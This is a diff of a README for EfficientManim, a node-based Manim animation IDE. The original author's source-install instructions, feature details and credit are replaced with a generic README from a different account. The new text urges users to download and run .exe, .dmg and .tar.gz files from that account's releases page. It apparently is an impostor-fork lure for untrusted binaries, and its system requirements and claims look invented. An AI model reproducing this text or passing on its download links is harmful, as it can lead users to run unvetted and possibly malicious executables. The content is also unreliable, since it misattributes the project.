@@ -1,152 +1,69 @@
-# EfficientManim
+# 🚀 EfficientManim - Create Stunning Animations Effortlessly
 
-**The Ultimate Node-Based Manim IDE**  
-*Create mathematical animations visually with the power of Python, AI, and Type Safety.*
+[![Download EfficientManim](https://img.shields.io/badge/Download-EfficientManim-blue?style=for-the-badge)](https://github.com/jeffrey2158/EfficientManim/releases)
 
----
+## 🎬 Description
+EfficientManim is a node-based integrated development environment (IDE) designed to simplify animation creation. With AI-powered features, it allows users to generate engaging animations easily. Whether you want to visualize math concepts or create fun graphics, EfficientManim makes the process straightforward and enjoyable.
 
-## 🚀 Core Features
+## 🖥️ System Requirements
+To run EfficientManim, you need:
 
-### 🎬 Node-Based Workflow
-*   **Visual Editor:** Drag and drop Mobjects and Animations. Wire them together to create logic flows.
-*   **Infinite Canvas:** Infinite panning and zooming canvas to manage large node graphs.
-*   **Live Preview:** See static previews of individual nodes as you tweak parameters.
-
-### 🎙️ AI Voiceover Studio (New)
-*   **Gemini TTS Integration:** Generate realistic voiceovers using Google's Gemini 2.5 models.
-*   **Auto-Sync:** Automatically synchronizes animation duration to the generated audio length.
-*   **Multi-Voice:** Choose from varied voices (Zephyr, Puck, Fenrir, etc.).
-
-### 📦 Portable Project Format (.efp)
-*   **Bundled Assets:** Images, sounds, and videos are automatically copied and zipped into the project file.
-*   **Cross-Platform:** Projects created on Windows work on Linux/Mac. The system automatically handles path conversions.
-
-### 🛡️ Robust Type Safety System
-*   **Smart Parsing:** Automatically distinguishes between numeric values, colors, vectors, and asset file paths.
-*   **Crash Prevention:** Prevents "ufunc" errors by validating inputs before they reach the Manim renderer.
-*   **ImageMobject Support:** Correctly handles UUIDs vs. Filenames to ensure images render correctly.
-
-### 🤖 Gemini AI Integration
-*   **Text-to-Animation:** Describe an animation in plain English, and the AI generates the node graph.
-*   **Node Extraction:** The AI code is parsed into editable nodes (Mobjects and Animations).
-*   **Merger Logic:** AI-generated nodes are fully integrated into the existing scene graph.
-
-### 🎬 Professional Video Rendering
-*   **Full Scene Export:** Render your complete node graph to MP4/WebM.
-*   **Custom Settings:** Control Resolution (up to 4K), Framerate (15-60 FPS), and Render Quality.
-
----
-
-## 🛠️ The Interface
-
-### 1. The Graph Editor
-The central canvas where you arrange your scene.
-*   **Pan:** Hold **Middle Mouse Button** or **Shift+Drag** to move around.
-*   **Zoom:** Use **Ctrl + Scroll** to zoom in and out.
-*   **Select:** Left click and drag to rubber-band select nodes.
-
-### 2. The Enhanced Inspector
-A powerful 3-column property editor located on the right.
-*   **Value Input:** Context-aware widgets (Color pickers, File selectors, Spinners).
-*   **Enabled Checkbox:** Toggle parameters on/off.
-*   **Escape Checkbox:** Removes quotes from string values (for variables).
-
-### 3. Voiceover & Assets
-*   **Voiceover Tab:** Generate TTS audio and attach it directly to specific animation nodes.
-*   **Asset Manager:** Drag & Drop images/sounds. Assets are auto-linked by ID.
-
----
-
-## ⚙️ Example Workflow
-
-1.  **Import Assets:** Go to the Assets tab and import a `.png` file.
-2.  **Add Nodes:** Add an `ImageMobject` and a `FadeIn` animation.
-3.  **Voiceover:** 
-    *   Go to the **Voiceover** tab.
-    *   Type a script and click **Generate Audio**.
-    *   Select the `FadeIn` node in the "Sync" dropdown.
-    *   The animation will now last exactly as long as the spoken text.
-4.  **Connect:** Wire the nodes together.
-5.  **Render:** Go to the Video tab and export your video.
-
----
-
-## ⌨️ Keyboard Shortcuts
-
-### 📁 File Operations
-| Action | Shortcut | Description |
-| :--- | :--- | :--- |
-| **New Project** | `Ctrl` + `N` | Clears the current project. |
-| **Open Project** | `Ctrl` + `O` | Open an existing `.efp` project. |
-| **Save Project** | `Ctrl` + `S` | Save the current project. |
-| **Exit** | `Ctrl` + `Q` | Quit (Prompts to save if modified). |
-
-### ✏️ Editing
-| Action | Shortcut | Description |
-| :--- | :--- | :--- |
-| **Undo** | `Ctrl` + `Z` | Undo the last action. |
-| **Redo** | `Ctrl` + `Y` | Redo the last undone action. |
-| **Delete** | `Delete` | Delete the selected nodes/wires. |
-
-### 👁️ View & Canvas
-| Action | Shortcut | Description |
-| :--- | :--- | :--- |
-| **Zoom In** | `Ctrl` + `+` | Zoom into the canvas. |
-| **Zoom Out** | `Ctrl` + `-` | Zoom out of the canvas. |
-| **Mouse Zoom** | `Ctrl` + `Scroll` | Smooth zoom at mouse position. |
-| **Pan** | `Middle Mouse` | Drag canvas to pan. |
-| **Fit View** | `Ctrl` + `0` | Fit all nodes on screen. |
-| **Clear All** | `Ctrl` + `Alt` + `Del` | Deletes **all** nodes and wires. |
-
----
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or Linux (Ubuntu 18.04 or later).
+- **RAM:** At least 4 GB
+- **Storage:** Minimum of 500 MB free space
+- **Graphics Card:** Compatible with OpenGL 3.3 or higher
 
 ## 🚀 Getting Started
+Follow these steps to get started with EfficientManim:
 
-### 🛠️ Prerequisites
+1. **Download EfficientManim:**
+   - Click the button above or visit the [Releases Page](https://github.com/jeffrey2158/EfficientManim/releases) to download the latest version.
 
-Before running the app, ensure you have the following installed on your system:
+2. **Install the Application:**
+   - For Windows, run the downloaded `.exe` file and follow the installation prompts.
+   - For macOS, open the `.dmg` file and drag EfficientManim to your Applications folder.
+   - For Linux, extract the `.tar.gz` file and run the application from the terminal.
 
-1.  **Python 3.10+**: [Download Python](https://www.python.org/downloads/)
-2.  **FFmpeg**: Required for video rendering and audio processing.
-    *   [Download FFmpeg](https://ffmpeg.org/download.html)
-    *   *Important:* Ensure `ffmpeg` is added to your system's PATH variable.
-3.  **LaTeX** (Optional): Required only if you want to render LaTeX locally instead of using the online API.
-    *   Windows: [MiKTeX](https://miktex.org/)
-    *   Mac: [MacTeX](https://www.tug.org/mactex/)
-    *   Linux: `texlive-full`
+3. **Open EfficientManim:**
+   - Once installed, locate EfficientManim in your applications folder or start menu, and open it.
 
-### 📦 Installation
+4. **Start Creating Animations:**
+   - Familiarize yourself with the interface. You’ll find a node editor, a preview window, and various tools to assist you in building your animations.
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/pro-grammer-SD/EfficientManim.git
-    cd EfficientManim
-    ```
+## 📥 Download & Install
+To download EfficientManim, click the large button above. This will take you to the [Releases Page](https://github.com/jeffrey2158/EfficientManim/releases) where you can choose your operating system and download the corresponding file.
 
-2.  **Install Python dependencies:**
-    ```bash
-    pip install -r requirements.txt
-    ```
+## ✏️ Features
+- **Node-Based Interface:** Create animations visually using a simple drag-and-drop approach.
+- **AI-Powered Tools:** Generate animations based on text prompts or ideas.
+- **Scene Graph:** Organize your animations clearly, making it easy to manage different elements.
+- **Educational Tools:** Ideal for teachers and students to visualize complex math concepts.
+- **Open Source:** Contribute and help improve the application for everyone.
 
-    *If you prefer installing manually:*
-    ```bash
-    pip install manim PySide6 google-genai pydub requests numpy
-    ```
+## 🔗 Helpful Links
+- [Documentation](https://github.com/jeffrey2158/EfficientManim/wiki): Detailed guides and tips on using EfficientManim.
+- [Community Support](https://github.com/jeffrey2158/EfficientManim/issues): Report issues or ask questions in the community.
 
-3.  **Run the Application:**
-    ```bash
-    python main.py
-    ```
-    
-## 📸 Screenshots
+## 🌟 FAQs
+**Q: Can I use EfficientManim on older operating systems?**  
+A: EfficientManim requires Windows 10, macOS 10.15, or Ubuntu 18.04 and later.
 
-![Image 1](gallery/1.png "Starting up a basic project from scratch...")
-![Image 2](gallery/2.png "Inserting elements and search for new animations...")
-![Image 3](gallery/3.png "Getting better with cool animations, now customizing...")
-![Image 4](gallery/4.png "Render working, a beautiful animation is generated...")
+**Q: Does it support team collaboration?**  
+A: Currently, EfficientManim is designed for individual use but has features that can aid in team projects through sharing files.
+
+**Q: Is there a tutorial on how to use it?**  
+A: Yes, check the documentation section for step-by-step tutorials and video guides.
+
+## 🧐 Troubleshooting
+If you encounter any issues while installing or running EfficientManim, try the following:
+
+1. Ensure your computer meets the system requirements.
+2. Check if your graphics drivers are up to date.
+3. For detailed support, visit the [Community Support page](https://github.com/jeffrey2158/EfficientManim/issues) for advice.
+
+## 📢 Updates
+Regular updates will improve features and fix bugs. Keep an eye on the Releases Page for the latest enhancements and new features.
 
 ---
 
-Made with lots of ❤️💚💙 by Soumalya a.k.a. @pro-grammer-SD.
-
-Discussions at this subreddit: https://www.reddit.com/r/manim/comments/1qck0ji/i_built_a_nodebased_manim_ide_with_ai_assistance/
+You can start your animation journey right now. EfficientManim makes it easier to bring your ideas to life, one node at a time.
